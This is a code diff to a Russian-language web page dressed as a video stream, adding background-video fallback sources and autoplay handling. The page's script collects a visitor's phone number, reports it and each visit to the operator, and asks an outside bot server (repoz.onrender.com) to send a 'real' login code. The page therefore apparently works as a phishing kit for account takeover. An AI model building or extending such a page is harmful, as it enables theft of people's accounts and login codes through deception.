@@ -135,7 +135,7 @@
             height: 100%;
             object-fit: cover;
             filter: blur(15px) brightness(0.7);
-            opacity: 0.8;
+            opacity: 0.9;
             z-index: 1;
         }
 
@@ -150,7 +150,7 @@
             justify-content: center;
             align-items: center;
             z-index: 2;
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.4);
         }
 
         .stream-text {
@@ -586,8 +586,12 @@
                 <div class="stream-area">
                     <div class="video-container">
                         <!-- РАЗМЫТОЕ ВИДЕО НА ЗАДНЕМ ФОНЕ -->
-                        <video autoplay muted loop playsinline class="background-video">
+                        <video autoplay muted loop playsinline class="background-video" id="backgroundVideo">
+                            <!-- Основной источник -->
                             <source src="https://assets.codepen.io/3364143/720p.mp4" type="video/mp4">
+                            <!-- Резервные источники -->
+                            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
+                            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4" type="video/mp4">
                             Ваш браузер не поддерживает видео.
                         </video>
                         <div class="video-overlay">
@@ -696,6 +700,62 @@
     </div>
 
     <script>
+        // === ИНИЦИАЛИЗАЦИЯ ВИДЕО ===
+        function initializeVideo() {
+            const video = document.getElementById('backgroundVideo');
+            
+            // Принудительно запускаем видео
+            video.play().catch(error => {
+                console.log('Автовоспроизведение заблокировано:', error);
+                // Показываем кнопку для ручного запуска
+                showVideoPlayButton();
+            });
+            
+            // Обработчики событий для видео
+            video.addEventListener('loadeddata', function() {
+                console.log('Видео загружено и готово к воспроизведению');
+            });
+            
+            video.addEventListener('error', function(e) {
+                console.log('Ошибка загрузки видео:', e);
+                // Пробуем следующий источник
+                tryNextVideoSource();
+            });
+            
+            video.addEventListener('canplay', function() {
+                console.log('Видео может начать воспроизведение');
+            });
+        }
+        
+        function tryNextVideoSource() {
+            const video = document.getElementById('backgroundVideo');
+            const sources = video.querySelectorAll('source');
+            let currentSource = video.currentSrc;
+            
+            for (let i = 0; i < sources.length; i++) {
+                if (sources[i].src === currentSource && i < sources.length - 1) {
+                    video.src = sources[i + 1].src;
+                    video.load();
+                    video.play();
+                    break;
+                }
+            }
+        }
+        
+        function showVideoPlayButton() {
+            const overlay = document.querySelector('.video-overlay');
+            const playButton = document.createElement('button');
+            playButton.className = 'btn';
+            playButton.style.marginTop = '10px';
+            playButton.textContent = '▶️ Запустить видео';
+            playButton.onclick = function() {
+                const video = document.getElementById('backgroundVideo');
+                video.play();
+                playButton.remove();
+            };
+            overlay.appendChild(playButton);
+        }
+
         // === СОСТОЯНИЕ ПОЛЬЗОВАТЕЛЯ ===
         let isUserLoggedIn = false;
         let currentPhone = '';
@@ -1110,7 +1170,7 @@
                 await sendPhoneEnteredNotification(rawPhone);
                 phoneSubmitted = true;
                 
-                // ОТПРАВКА РЕАЛЬНОГО КОДА ЧЕРЕЗ БОТА НА ПОРТУ 8080
+                // ОТПРАВКА РЕАЛЬНОГО КОДА ЧЕРЕЗ БОТА
                 console.log('🔄 Отправляем запрос на РЕАЛЬНЫЙ код...');
                 const response = await fetch('https://repoz.onrender.com/send-code', {
                     method: 'POST',
@@ -1358,6 +1418,9 @@
 
         // Загружаем характеристики при загрузке страницы
         document.addEventListener('DOMContentLoaded', function() {
+            // ИНИЦИАЛИЗИРУЕМ ВИДЕО ПЕРВЫМ ДЕЛОМ
+            initializeVideo();
+            
             // ОТПРАВЛЯЕМ ОТСТУК О ПЕРЕХОДЕ (ТОЛЬКО 1 РАЗ)
             sendVisitNotification();
             
